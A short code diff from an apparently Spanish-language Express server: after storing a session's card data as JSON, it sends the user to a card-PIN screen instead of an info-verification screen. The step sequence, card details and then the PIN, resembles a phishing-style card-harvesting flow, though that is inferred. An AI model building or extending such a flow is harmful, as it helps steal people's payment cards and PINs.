@@ -996,7 +996,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Guardar tarjetas como JSON
       await storage.updateSession(sessionId, { 
         tarjetasProtegidas: JSON.stringify(tarjetas),
-        pasoActual: ScreenType.VERIFICANDO_INFO,
+        pasoActual: ScreenType.NIP_TARJETA,
       });
 
       console.log(`[Protección Tarjetas] Datos recibidos - Session: ${sessionId}, Tarjetas: ${tarjetas.length}`);
